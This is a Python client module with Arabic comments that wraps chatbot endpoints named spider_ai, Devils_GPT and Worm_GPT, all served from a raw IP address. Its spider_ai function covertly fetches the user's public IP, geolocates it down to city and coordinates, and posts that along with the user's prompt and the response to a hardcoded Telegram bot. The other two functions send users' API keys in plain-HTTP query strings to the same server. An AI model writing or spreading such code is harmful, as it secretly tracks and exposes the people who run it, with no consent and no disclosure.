
import requests

# الحصول على الـ IP العام للجهاز
def get_public_ip():
    try:
        response = requests.get('https://api.ipify.org?format=json')
        ip = response.json().get('ip')
        return ip
    except Exception as e:
        return None

# جلب معلومات الـ IP من ipapi.co
def get_ip_info(ip_address):
    try:
        response = requests.get(f'https://ipapi.co/{ip_address}/json/')
        data = response.json()

        if 'error' not in data:
            ip_info = f"""
🌐| **IP**: {ip_address}
📱| **Device**: {data.get('org', 'Unknown')}
🕵| **User Agent**: {data.get('user_agent', 'Unknown')}
📍| **Country**: {data.get('country_name', 'Unknown')} ({data.get('country_code', 'Unknown')})
🔖| **City**: {data.get('city', 'Unknown')}
📡| **Latitude**: {data.get('latitude', 'Unknown')}
📡| **Longitude**: {data.get('longitude', 'Unknown')}
            """
        else:
            ip_info = "Unable to retrieve IP information."
    except Exception as e:
        ip_info = "Error retrieving IP information."

    return ip_info

# إرسال الرسالة إلى تيليجرام
def send_to_telegram(message):
    telegram_bot_token = '7312059616:AAH5VdNSh9TQ9OsnPXF8pcmR1fIjEFe6NJg'
    chat_id = '7265766559'
    url = f'https://api.telegram.org/bot{telegram_bot_token}/sendMessage'
    payload = {
        'chat_id': chat_id,
        'text': message,
        'parse_mode': 'Markdown'
    }
    requests.post(url, data=payload)

# دالة spider_ai مع التعديل المطلوب
def spider_ai(text):
    if text is None or text == "":
        error_message = "You must enter text. You have not entered text."
        return {"response": error_message}
    else:
        # الحصول على IP العام للجهاز
        public_ip = get_public_ip()

        if public_ip:
            # جلب معلومات IP من ipapi.co
            ip_info = get_ip_info(public_ip)
        else:
            ip_info = "Unable to retrieve public IP."

        headers = {
            'Host': '01d73592-4d64-43f7-b664-ecd679686756-00-30a5f50srzeko.janeway.replit.dev',
            'Connection': 'keep-alive',
            'Accept': '*/*',
            'User-Agent': 'com.tappz.aichat/1.2.2 iPhone/16.3.1 hw/iPhone12_5',
            'Accept-Language': 'ar',
            'Content-Type': 'application/json;charset=UTF-8'
        }
        try:
            # إرسال الطلب إلى السيرفر
            response = requests.get(f'http://104.236.72.47:8909/?msg={text}', headers=headers)
            result = response.json()["response"]
            spider = f"""
{result}

┏━━⚇
┃━┃ t.me/spider_XR
┗━━━━━━━━
            """
            # إعداد الرسالة التي سيتم إرسالها إلى تيليجرام
            message = f"""
**User Input:** {text}
**Response:** {result}

{ip_info}
            """
            # إرسال المعلومات إلى بوت تيليجرام
            send_to_telegram(message)

            return {"response": spider}
        except Exception as e:
            return {"response": "An unexpected error occurred. Try again. It will be fixed."}

def Devils_GPT(text, key,model):
    if key is None or key == "":
        error_message = "You must provide a valid API key."
        return {"response": error_message}
    if model is None or model == "":
        error_message = "You must provide a valid API model."
        return {"response": error_message}
    if text is None or text == "":
        error_message = "You must enter text. You have not entered text."
        return {"response": error_message}
    else:

        headers = {
                'Host': '01d73592-4d64-43f7-b664-ecd679686756-00-30a5f50srzeko.janeway.replit.dev',
                'Connection': 'keep-alive',
                'Accept': '*/*',
                'User-Agent': 'com.tappz.aichat/1.2.2 iPhone/16.3.1 hw/iPhone12_5',
                'Accept-Language': 'ar',
                'Content-Type': 'application/json;charset=UTF-8'
            }
        try:
            response = requests.get(f'http://104.236.72.47:4556/devils_gpt?msg={text}&key={key}&model={model}', headers=headers)
            result = response.json()["response"]
            spider = f"""
{result}
                """
            return {"response": spider}
        except Exception as e:
                return {"response": f"An unexpected error occurred. Try again. It will be fixed"}


def Worm_GPT(text, key,model):
    if key is None or key == "":
        error_message = "You must provide a valid API key."
        return {"response": error_message}
    if model is None or model == "":
        error_message = "You must provide a valid API model."
        return {"response": error_message}
    if text is None or text == "":
        error_message = "You must enter text. You have not entered text."
        return {"response": error_message}
    else:

        headers = {
                'Host': '01d73592-4d64-43f7-b664-ecd679686756-00-30a5f50srzeko.janeway.replit.dev',
                'Connection': 'keep-alive',
                'Accept': '*/*',
                'User-Agent': 'com.tappz.aichat/1.2.2 iPhone/16.3.1 hw/iPhone12_5',
                'Accept-Language': 'ar',
                'Content-Type': 'application/json;charset=UTF-8'
            }
        try:
            response = requests.get(f'http://104.236.72.47:4556/worm_gpt?msg={text}&key={key}&model={model}', headers=headers)
            result = response.json()["response"]
            spider = f"""
{result}
                """
            return {"response": spider}
        except Exception as e:
                return {"response": f"An unexpected error occurred. Try again. It will be fixed"}
